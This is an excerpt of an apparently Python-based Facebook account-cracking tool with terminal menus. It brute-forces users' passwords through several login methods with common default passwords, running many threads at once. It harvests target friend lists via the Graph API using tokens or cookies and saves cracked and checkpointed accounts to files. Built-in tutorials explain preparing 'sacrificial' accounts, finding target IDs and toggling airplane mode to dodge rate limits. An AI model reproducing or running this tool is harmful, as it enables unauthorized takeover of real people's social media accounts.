        put = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
...
class crack:
    def __init__(self,files):
        ...
        while True:
            pilih_methode();_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sCrack From Password Default/Manual [d/m]'%(O,P,O,P))
            _pilih_sandi_ = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
            if _pilih_sandi_=="":jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
                ...
                _dapunta_cici_('%s╠══[%s•%s] %sEample : pakistan,786786,123456'%(O,P,O,P));self.pwlist();break
            elif _pilih_sandi_ in ['d','D','1','01','001']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _dapunta_dapunta_(self.apk).read().splitlines();break
                        except Exception as e:_dapunta_cici_ ("   %s"%(e));continue
                    self.fl = [];start_methodezz();kopi = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
                    if kopi in ['']:
                        jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P))
                        menu()
                    elif kopi in ['1','01']:
                        for i in self.fs:
                    ...
                    _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sWant CP? [y/t] : '%(O,P,O,P))
                    if puf in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
                    ...
                    elif puf in ['2','02','002','t','T']:auto_ganti_pass('Not');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                    else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
                except Exception as e:_dapunta_cici_(("   %s"%e))
    def pwlist(self):
        self.pw = _cici_dapunta_('%s╠══[%s•%s] %sEnter Password : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:self.pwlist()
            ...
            elif puf in ['2','02','002','t','T']:auto_ganti_pass('Not');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
            else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
...
def set_pass_dev(_file_):
    ...
    try:
        pilih_methode()
        _dapunta_cici_('%s║'%(O))
        _dapunta_cici_('%s╠══[%s•%s] %sExample : 123456,1122,786786'%(O,P,O,P))
        _pasword_ = _cici_dapunta_('%s╠══[%s•%s] %sEnter Password : '%(O,P,O,P)).split(",")
        if len(_pasword_)==0:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
        _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sWant CP? [y/t] : '%(O,P,O,P))
        if puf in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
        elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close()
        elif puf in ['2','02','002','t','T']:auto_ganti_pass('Not');cok = open('opsi_cp.txt','w');cok.write('null');cok.close()
        else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
...
def crack_langsung_dev(_user_id_,_password_):
    ...
    try:
        ...
        for _pass_ in _password_:
            _pass_ = _pass_.lower()
            if 'method_api_v1' in metode:log = log_api_1(_user_id_,_pass_)
            elif 'method_api_v2' in metode:log = log_api_2(_user_id_,_pass_)
            elif 'method_mbasic_v1' in metode:log = log_mbasic_1(_user_id_,_pass_)
            elif 'method_mbasic_v2' in metode:log = log_mbasic_2(_user_id_,_pass_)
            elif 'method_mobile_v1' in metode:log = log_mobile_1(_user_id_,_pass_)
            elif 'method_mobile_v2' in metode:log = log_mobile_2(_user_id_,_pass_)
            ...
            if log.get("status")=="cp":
                ...
                if _user_id_ in files_ok:pass
                    ...
                    if 'method_mbasic_v1' in metode or 'method_mbasic_v2' in metode or 'method_mobile_v1' in metode or 'method_mobile_v2' in metode:h_ok = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,_user_id_,_pass_,tahun(_user_id_),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
...
def teman_target():
    it = _cici_dapunta_('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
    try:token = _dapunta_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);_dapunta_cici_ ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,nn['name']))
    ...
    for id in tt:
        ...
        except KeyError:_dapunta_cici_('╠══[!] Spam Accounts')
    _dapunta_cici_('║');_cici_dapunta_('╚══[ Return ]');menu()

### Menu Mengecek Hasil Crack
def hasil():
    clear()
    jalan('%s╔══[ %sTotal Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s1%s] %sCheck Total OK'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCheck Total CP'%(O,P,O,P));ch = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
    if ch in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK");_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s Crack Results Stored in File OK %s]'%(O,P,O));_dapunta_cici_('%s║'%(O))
            for file in okl:_dapunta_cici_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            _dapunta_cici_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sEnter File : '%(O,P,O,P));_dapunta_cici_('')
            if files == "":jalan('%s═══[%s!%s] %sCorrect'%(M,P,M,P));hasil()
            try:
                ppp = _dapunta_dapunta_("OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');_dapunta_cici_('%s[%sOK%s] %s'%(H,P,H,yyy))
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Crack Result Date %s ls %s account'%(O,P,O,P,del1,len(ppp)))
            except:_dapunta_cici_('%s╠══[%s No Results Found %s]'%(M,P,M))
        except (KeyError,IOError):_dapunta_cici_('%s╠══[%s No Results Found %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP");_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s Crack Results Stored in CP Files %s]'%(O,P,O));_dapunta_cici_('%s║'%(O))
    ...
    _dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu()

def cek_hasil():
    try:os.remove('opsi_dev.txt')
    except:pass
    cik = open('opsi_dev.txt','w');cik.write('hasil');cik.close()
    print('%s╠══[ %sCheck Crack Result Account Options %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sExample File : %s.txt'%(O,P,O,P,tanggal));files__ = _cici_dapunta_('%s╠══[%s•%s] %sFile : '%(O,P,O,P));files = "CP/"+files__
    try:buka_baju = _dapunta_dapunta_(files,"r").read().splitlines()
    except FileNotFoundError:_dapunta_cici_("%s╚══[%s!%s] %sFile Not Existing"%(M,P,M,P));time.sleep(2); menu()
    auto_ganti_pass('Ya');_dapunta_cici_("%s╚══[%s•%s] %sNumber of Accounts : %s"%(O,P,O,P,str(len(buka_baju))));_dapunta_cici_("")
    ...
    _dapunta_cici_("");_dapunta_cici_('%s╔══[%s•%s] %sChecking Process Complete'%(O,P,O,P));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu()

### Variasi Teks
def var_menu():
    _dapunta_cici_('%s╔[ %sChoose Login Method %s]'%(O,P,O))
    _dapunta_cici_('%s╠══[%s1%s] %sLogin With Token [%sLimited Access%s]'%(O,P,O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sLogin With Cookies [%sUnlimited Access%s]'%(O,P,O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠[ %sFeatures Without Login %s]'%(O,P,O))
    _dapunta_cici_('%s╠══[%s3%s] %sTutorial Use Script'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s5%s] %sCheck Total Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s6%s] %sCheck Total Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s0%s] %sReturn'%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
def var_tutor():
    mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s1%s] %sHow to Take Token'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sHow To Take Cookies'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s3%s] %sHow to get Target'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sWay During Process Crack'%(O,P,O,P))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process     %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %sChange the Sacrifice Account Password First           %s║'%(O,P,O,P,O))
    ...
    mlaku('%s║ %s7 %s║ %sSee URL/Link at the top, there are \'id=10001xx\' %s║'%(O,P,O,P,O))
    mlaku('%s║ %s8 %s║ %sWell, that target ID ready to be cracked   %s║'%(O,P,O,P,O))
...
def tutor_crack():
    ...
    mlaku('%s║ %s2 %s║ %sMethod Mbasic : Process is rather fast, rarely gets spam  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %sMethod Mobile : Slow Process, Probably OK  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %sCrack Using Data (Not Support Wifi)    %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %sIf the results do not appear when the crack is running       %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %sTurn On Flight Mode For 5 Sec                    %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    _dapunta_cici_('%s║'%(O))
def var_author():
    ...
    mlaku('%s║     • %shussainj'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sALI RAZA'%(O,P))
    mlaku('%s║     • %sHUSSAINI'%(O,P))
    mlaku('%s║     • %sMAIN KHUD'%(O,P))
    mlaku('%s║     • %sMAIN KHUD'%(O,P))
    mlaku('%s║     • %sMAIN KHUD'%(O,P))
    mlaku('%s║     • %sMAIN KHUD'%(O,P))
    mlaku('%s║     • %sMAIN KHUD'%(O,P))
    ...
    mlaku('%s║'%(O))
def var_ugen():
    _dapunta_cici_("%s╠══[%s1%s] %sGet User Agent"%(O,P,O,P))
    _dapunta_cici_("%s╠══[%s2%s] %sChange User Agent %s(%sManual%s)"%(O,P,O,P,O,P,O))
    _dapunta_cici_("%s╠══[%s3%s] %sChange User Agent %s(%sCustomize HP%s)"%(O,P,O,P,O,P,O))
    _dapunta_cici_("%s╠══[%s4%s] %sDelete User Agent"%(O,P,O,P))
    _dapunta_cici_("%s╠══[%s5%s] %sCheck User Agent"%(O,P,O,P))
    _dapunta_cici_("%s╠══[%s0%s] %sReturn"%(O,P,O,P))
def start_method():
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s1%s] %sMethod Api V1'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sMethod Api V2'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s3%s] %sMethod Mbasic V1'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sMethod Mbasic V2'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s5%s] %sMethod Mobile FB V1'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s6%s] %sMethod Mobile FB V2'%(O,P,O,P))
def start_methodezz():
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s1%s] %sFast Crack %s[%sFew Results%s]'%(O,P,O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s2%s] %sSlow Crack %s[%sMultiple Results%s]'%(O,P,O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s3%s] %sVery Slow Crack %s[%sMore Results%s]'%(O,P,O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s4%s] %sCombined Password Crack'%(O,P,O,P))
def started():
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s•%s] %sCrack is Running...'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╠══[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╚══[%s•%s] %sActivate Airplane Mode [5 Seconds Only] Every 5 Minutes\n'%(O,P,O,P))
def kata_buat_perecode():
    clear()
    _dapunta_cici_('%s╔══[ %sPermission/Warning %s]'%(M,P,M))
    _dapunta_cici_('%s║'%(M))
    _dapunta_cici_('%s╠══[ %sEnglish %s]'%(M,P,M))
    _dapunta_cici_('%s║   • %sYou can Change This SC'%(M,P))
    _dapunta_cici_('%s║   • %sTanpa Seizin Author'%(M,P))
    _dapunta_cici_('%s║   • %sWithout Author Permission'%(M,P))
    ...
    _dapunta_cici_('%s║   • %sTThank You'%(M,P))
    _dapunta_cici_('%s║'%(M))
    _dapunta_cici_('%s╠══[ %sEnglish %s]'%(M,P,M))
    ...
    _dapunta_cici_('%s║'%(M))
    _dapunta_cici_('%s╚══[ %sRegard Ali %s]%s'%(M,P,M,P))
    _dapunta_cici_('%s'%(P))
    _cici_cici_()
